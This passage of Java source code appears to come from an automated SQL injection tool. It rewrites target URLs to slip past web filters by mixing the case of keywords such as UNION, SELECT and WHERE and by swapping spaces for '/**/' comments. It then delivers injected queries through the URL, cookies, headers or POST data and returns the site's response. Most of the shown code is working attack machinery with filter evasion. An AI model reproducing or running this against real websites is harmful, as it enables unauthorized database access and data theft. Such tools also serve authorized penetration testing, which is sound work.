						.replaceAll("from\\+", "FrOm+")
						.replaceAll("from\\(", "FrOm(")
						.replaceAll("where\\+", "wHeRe+")
						.replaceAll("([AE])=0x", "$1+lIkE+0x")
						;
				break;
				case 2: urlUltimate = urlUltimate
						.replaceAll("union\\+", "uNiOn/**/")
						.replaceAll("select\\+", "sElEcT/**/")
						.replaceAll("from\\+", "FrOm/**/")
						.replaceAll("from\\(", "FrOm(")
						.replaceAll("where\\+", "wHeRe/**/")
						.replaceAll("([AE])=0x", "$1/**/lIkE/**/0x")
						;
						urlUltimate = urlUltimate.replaceAll("--\\+", "--")
						.replaceAll("\\+", "/**/")
						;
				break;
				}
//				System.out.println(new Date() + " " + urlUltimate);
				urlObject = new URL(urlUltimate);
			} catch (MalformedURLException e) {
				this.sendErrorMessage(e.getMessage());
			}
		}
		
		try {
			connection = (HttpURLConnection) urlObject.openConnection();
			connection.setReadTimeout(15000);
			connection.setConnectTimeout(15000);
		} catch (IOException e) {
			this.sendErrorMessage(e.getMessage());
		}
		
		String logs = "\n";
				
		if(!this.cookieData.equals("")){
			connection.addRequestProperty("Cookie", this.buildQuery("COOKIE", cookieData, useVisibleIndex, dataInjection));
			logs += "Cookie: " + this.buildQuery("COOKIE", cookieData, useVisibleIndex, dataInjection) + "\n";
		}
		
		if(!this.headerData.equals("")){
			for(String s: this.buildQuery("HEADER", headerData, useVisibleIndex, dataInjection).split(";")){
				try {
					connection.addRequestProperty(s.split(":",2)[0], URLDecoder.decode(s.split(":",2)[1],"UTF-8"));
				} catch (UnsupportedEncodingException e) {
					this.sendErrorMessage(e.getMessage());
				}
			}
			logs += "Header: " + headerData + "\n";
		}
		
		if(!this.postData.equals("")){
			try {
		        connection.setDoOutput(true);
		        connection.setRequestMethod("POST");
		        connection.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");
	
		        DataOutputStream dataOut = new DataOutputStream(connection.getOutputStream());
		        dataOut.writeBytes(this.buildQuery("POST", postData, useVisibleIndex, dataInjection));
		        dataOut.flush();
		        dataOut.close();
		        
				logs += "Post: " + this.buildQuery("POST", postData, useVisibleIndex, dataInjection) + "\n";
			} catch (IOException e) {
				this.sendErrorMessage(e.getMessage());
			}
		}
		
	    logs += urlUltimate+"\n";
	    for (int i=0; ;i++) {
	        String headerName = connection.getHeaderFieldKey(i);
	        String headerValue = connection.getHeaderField(i);
	        if (headerName == null && headerValue == null) break;
	        
	        logs += (headerName==null?"":headerName+": ")+headerValue+"\n";
	    }
		
	    new GUIThread("add-header", logs).run();	
	    
		String line, pageSource = "";
		try {
			BufferedReader reader = new BufferedReader(new InputStreamReader( connection.getInputStream() ));
			while( (line = reader.readLine()) != null ) pageSource += line;
			reader.close();
		} catch (MalformedURLException e) {
			this.sendErrorMessage(e.getMessage());
		} catch (IOException e) {
			this.sendErrorMessage(e.getMessage()); /* lot of timeout in local use */
		}
		
		return pageSource;
	}
	
	private String buildQuery( String dataType, String newData, boolean useVisibleIndex, String urlPremiere ){
		if(!this.method.equals(dataType)){
			return newData;
		}else if(!useVisibleIndex){
			return newData + urlPremiere;
		}else{
			return newData + this.initialQuery.replaceAll("1337"+visibleIndex+"7331","("+urlPremiere+")");
		}
	}
	
	public void sendMessage(String message) {
	    new GUIThread("console-message",message+"\n").run();
	}
	public void sendResponseFromSite(String message, String source) {
		this.sendMessage( message + ", response from site:\n>>>"+ source );
	}
	public void sendErrorMessage(String message) {
		this.sendMessage("*** "+message);
	}
}
